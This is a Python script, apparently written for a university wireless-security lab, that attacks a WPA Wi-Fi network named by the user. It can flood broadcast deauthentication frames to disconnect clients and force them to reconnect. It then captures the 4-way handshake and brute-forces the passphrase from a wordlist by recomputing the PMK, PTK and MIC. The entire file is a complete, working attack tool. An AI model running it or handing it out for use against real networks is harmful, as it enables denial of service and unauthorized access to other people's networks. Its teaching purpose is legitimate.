#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Author: Victor Truan, Jerome Bagnoud | SWI - Labo 04 - Exo 03

"""
Il est possible que les 4 messages du handshake ne soit pas capturé, parce que certains packets se perdent en route, ou parce que il y a des
retransmission de packet, et cela fausse le résultat.

Si les 4 packets de handshake ne sont pas trouvés le programme doit être relancé.
"""

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
from numpy import right_shift
import hmac, hashlib
import argparse
import sys

# Arguments
parser = argparse.ArgumentParser(description="Ce script permet de bruteforce des passphrases WPA. Nécessite la connexion d'un utilisateur, il y a la possiblité de déauthetifier des clients déjà connectés.")
parser.add_argument("-i", "--interface", required=True, help="l'interface a utiliser")
parser.add_argument("-s", "--ssid", required=True, help="le ssid de l'AP à brute force")
parser.add_argument("-d", "--deauth", action='store_true', help="switch permettant de decider si on veut deauth les clients afin de forcer une reconnexion.")
parser.add_argument("-w", required=True, type=str, help="nom du fichier de dictionnaire")

arguments = parser.parse_args()

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = arguments.ssid
handshakeCounter = 0
BROADCAST_MAC_ADDRESS = "FF:FF:FF:FF:FF:FF"
handshakeList = list()
APmac = ""
Clientmac = ""

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

def packetHandling(packet):
    global handshakeCounter
    global APmac
    global Clientmac

    if(EAPOL in packet):
        if(handshakeCounter == 0 or APmac == a2b_hex(packet.addr3.replace(":", ""))):
            handshakeCounter += 1
            handshakeList.append(packet)
            print("[+] Found handshake part " + str(handshakeCounter) + " over 4")

        if(handshakeCounter == 1):
            APmac       = a2b_hex(handshakeList[0].addr2.replace(":", ""))
            Clientmac   = a2b_hex(handshakeList[0].addr1.replace(":" , ""))
        
        # We got the 4 packets of the handshake
        if(len(handshakeList) == 4):
            bruteForceWPA(handshakeList)

def bruteForceWPA(handshakeList):
    global ssid
    global APmac
    global Clientmac

    # Authenticator and Supplicant Nonces
    nonceStartingOffset = 13
    nonceEndOffset = 45
    ANonce      = handshakeList[0].load[nonceStartingOffset:nonceEndOffset]
    SNonce      = handshakeList[1].load[nonceStartingOffset:nonceEndOffset]

    # This is the MIC contained in the 4th frame of the 4-way handshake
    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
    micStartingOffset = 77
    micEndOffset = 93
    mic_to_test = handshakeList[3].load[micStartingOffset:micEndOffset]

    B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

    # Here we are taking the data from the WIFI version, until the start of the MIC, and then we simply append a bunch of zero bytes at the end.
    data        = bytes(handshakeList[3][EAPOL])[:micStartingOffset] + b'\x00' * 22
    ssid = str.encode(ssid)
    fileName = arguments.w
    found = False

    # Used to know wether it is HMAC-MD5 or HMAC-SHA1
    keyDescriptorVersion = int.from_bytes(handshakeList[0].load[0:1], byteorder='big')

    with open(fileName) as wordlist:
        for passPhrase in wordlist:
            # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
            # We are getting rid of the '\n'
            passPhrase = str.encode(passPhrase[:-1])
            pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

            # Expand pmk to obtain PTK
            ptk = customPRF512(pmk,str.encode(A),B)

            # Calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
            if(keyDescriptorVersion == 2):
                mic = hmac.new(ptk[0:16],data,hashlib.sha1)
            else:
                mic = hmac.new(ptk[0:16],data,hashlib.md5)
            
            if mic.hexdigest() == b2a_hex(mic_to_test).decode():
                print("[+] Found passphrase: " + passPhrase.decode())
                # Source: https://www.geeksforgeeks.org/python-exit-commands-quit-exit-sys-exit-and-os-_exit/
                sys.exit("")
        
        if not found:
            print("[-] Passphrase not found !")

# If we want to do a deauth
if(arguments.deauth):
    print("[+] Sniffing 2sec !")
    packets = sniff(iface=arguments.interface, timeout=2)
    for packet in packets:
        # We must try because some packets does not have the info field.
        try:
            if packet.info.decode() == ssid:
                deauthPacket = RadioTap() / Dot11(type=0, subtype=12, addr1=BROADCAST_MAC_ADDRESS, addr2=packet.addr2, addr3=packet.addr3) / Dot11Deauth(reason=7)
                print("[+] Sending deauth")
                for i in range(0, 50):
                    sendp(deauthPacket, iface=arguments.interface, verbose=False)
                break
        except:
            pass

print("[+] Listening for handshake")
a = sniff(iface=arguments.interface, prn=packetHandling)